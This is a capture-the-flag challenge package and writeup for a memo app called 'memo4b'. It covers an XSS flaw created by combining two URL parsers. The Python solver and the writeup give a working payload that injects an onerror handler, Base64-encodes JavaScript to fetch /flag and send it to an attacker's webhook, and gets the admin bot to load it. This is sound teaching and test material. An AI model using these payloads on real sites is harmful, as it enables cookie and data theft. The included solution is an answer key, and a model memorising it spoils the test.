files.content:
# Vulnerability

An XSS vulnerability caused by URL parsing. By combining two different URL parsers, WHATWG URL and url-parse, it is possible to exploit differences in how they handle fragments (#) and trigger XSS.

# Theme

Implement an emoji feature in a simple memo-sharing application. In addition to normal emojis such as `:smile:`, specifying a URL like `:https://example.com/image.png:` renders it as an image. The app uses WHATWG URL to normalize the URL and url-parse to extract the fragment, which allows arbitrary parameters to be appended to the img tag.

# Expected Solve Path

1. Access the memo application and try the emoji feature described in the prompt.
2. Notice the URL emoji feature (`:https://...:`) and confirm that it renders an image.
3. Inspect the source code and discover that two different URL libraries are being used.
4. Realize that url-parse does not encode special characters in the fragment, especially `"`.
5. Discover that a payload like `:https://example.com/x.jpg#" onerror="alert(document.domain)":` enables XSS.
6. Build a payload that exfiltrates the flag using the admin bot.
7. Because including a colon (`:`) in the JavaScript code breaks the emoji processing, bypass it with Base64 or a similar encoding.

# Difficulty

medium

# References

- [url-parse - npm](https://www.npmjs.com/package/url-parse)
- [WHATWG URL Standard](https://url.spec.whatwg.org/)

FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm ci --only=production

COPY . .

RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001 && \
    chown -R nodejs:nodejs /app

USER nodejs

EXPOSE 50000

CMD ["node", "app.js"]

FROM node:18-alpine

RUN apk add --no-cache \
    chromium \
    nss \
    freetype \
    harfbuzz \
    ca-certificates \
    ttf-freefont

ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true \
    PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser

WORKDIR /app

COPY package*.json ./
RUN npm ci --only=production

COPY . .

RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001 && \
    chown -R nodejs:nodejs /app

USER nodejs

EXPOSE 50001

CMD ["node", "bot.js"]

#!/usr/bin/env python3
import requests
import base64

WEBHOOK_URL = "https://**REDACTED**"  # TODO: Specify the attacker's server
WEB_URL = "http://memo4b.challenges.beginners.seccon.jp:50000"
BOT_URL = "http://memo4b.challenges.beginners.seccon.jp:50001"

js_code = f"fetch('/flag').then(r=>r.text()).then(f=>location='{WEBHOOK_URL}?flag='+f)"
encoded = base64.b64encode(js_code.encode()).decode()
payload = f':https://example.com/x.jpg#" onerror="eval(atob(\'{encoded}\'))":'

data = {
    "title": "Test",
    "md": payload
}

# 1. Post a memo
r = requests.post(WEB_URL + "/", data=data, allow_redirects=False)
post_id = r.headers["Location"].split("/")[-1]
print(f"[+] Created post: {post_id}")

# 2. Request the bot to visit
r = requests.post(BOT_URL + "/visit", json={"postId": post_id})
print(f"[+] Bot visit status: {r.text}")

# 3. Check the flag via Webhook
print(f"[+] Check your webhook at: {WEBHOOK_URL}")

# memo4b - Writeup ## Overview memo4b is a simple memo-sharing application. This challenge exploits a vulnerability in the emoji feature. Specifically, combining two different URL parsers makes it possible to trigger XSS. ## Solution The application has two types of emoji features: 1. Normal emoji: `:smile:` → 😊 2. URL emoji: `:https://example.com/image.png:` → `` Looking at the `processEmojis` function in `app.js`, you can see that two different URL libraries are used when handling URL emojis: ```javascript if (name.match(/^https?:\/\//)) { try { const urlObj = new URL(name); // WHATWG URL (safe) const baseUrl = urlObj.origin + urlObj.pathname; const parsed = parse(name); // url-parse (vulnerable) const fragment = parsed.hash || ''; const imgUrl = baseUrl + fragment; return ``; } catch (e) { return match; } } ``` This implementation: - safely extracts the base URL with WHATWG URL - uses url-parse to obtain the fragment portion (# and after) - combines both to generate the final URL The url-parse library does not encode special characters in the fragment, especially `"`. That makes payloads like the following possible: ``` :https://example.com/x.jpg#" onerror="alert(1)" x=": ``` This payload becomes the following HTML: ```html ``` The `"` closes the `src` attribute, and the injected `onerror` attribute makes the XSS work. Next, build a payload that sends the admin's flag to an external server. However, if the JavaScript code contains `:`, the emoji processing breaks, so Base64 is used as a workaround: ```javascript // JavaScript code to execute fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/xxx?flag='+f) // Base64-encoded ZmV0Y2goJy9mbGFnJykudGhlbihyPT5yLnRleHQoKSkudGhlbihmPT5sb2NhdGlvbj0naHR0cHM6Ly93ZWJob29rLnNpdGUveHh4P2ZsYWc9JytmKQ== // Final payload :https://example.com/x.jpg#" onerror="eval(atob('ZmV0Y2goJy9mbGFnJykudGhlbihyPT5yLnRleHQoKSkudGhlbihmPT5sb2NhdGlvbj0naHR0cHM6Ly93ZWJob29rLnNpdGUveHh4P2ZsYWc9JytmKQ=='))": ``` Post a memo containing the payload above, then have the admin bot visit the posted memo ID. That causes the bot to send the flag to the server you control. ## Solver ```python #!/usr/bin/env python3 import requests import base64 WEBHOOK_URL = "https://webhook.site/your-unique-id" # Change this to your webhook WEB_URL = "http://localhost:50000" BOT_URL = "http://localhost:50001" # Base64-encode the JavaScript code js_code = f"fetch('/flag').then(r=>r.text()).then(f=>location='{WEBHOOK_URL}?flag='+f)" encoded = base64.b64encode(js_code.encode()).decode() payload = f':https://example.com/x.jpg#" onerror="eval(atob(\'{encoded}\'))":' data = { "title": "Test", "md": payload } # Post the memo r = requests.post(WEB_URL + "/", data=data, allow_redirects=False) post_id = r.headers["Location"].split("/")[-1] print(f"[+] Created post: {post_id}") # Ask the bot to visit it r = requests.post(BOT_URL + "/visit", json={"postId": post_id}) print(f"[+] Bot visit status: {r.text}") # Check the webhook for the flag print(f"[+] Check your webhook at: {WEBHOOK_URL}") print("[+] Flag should appear there within 5 seconds...") ```
